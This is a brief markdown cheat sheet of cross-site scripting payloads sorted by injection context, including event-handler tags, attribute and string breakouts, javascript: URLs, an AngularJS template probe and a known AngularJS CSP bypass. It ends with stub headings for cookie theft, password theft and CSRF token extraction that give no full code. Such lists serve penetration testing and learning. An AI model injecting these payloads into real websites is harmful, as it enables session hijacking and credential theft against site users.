# XSS Payload Reference

## HTML

### Payload 1

```html
<img src=1 onerror=alert(1)>
```

### Payload 2

```html
<svg onload=alert(1)>
```

---

## Attribute

### Payload 1

```html
" onmouseover="alert(1)
```

### Payload 2

```html
" autofocus onfocus="alert(1)
```

---

## href

```javascript
javascript:alert(1)
```

---

## JavaScript

```javascript
';alert(1)//
```

---

## Escaped Quotes

```javascript
\';alert(1)//
```

---

## Template Literal

```javascript
${alert(1)}
```

---

## AngularJS

```html
{{7*7}}
```

---

## AngularJS CSP Bypass

```html
<input
autofocus
ng-focus=
"$event.path|orderBy:'[].constructor.from([1],alert)'">
```

---

## Cookie Theft

```javascript
document.cookie
```

---

## Password Theft

```html
<input type=password>
```

---

## CSRF Bypass

```javascript
XHR
+
Token Extraction
```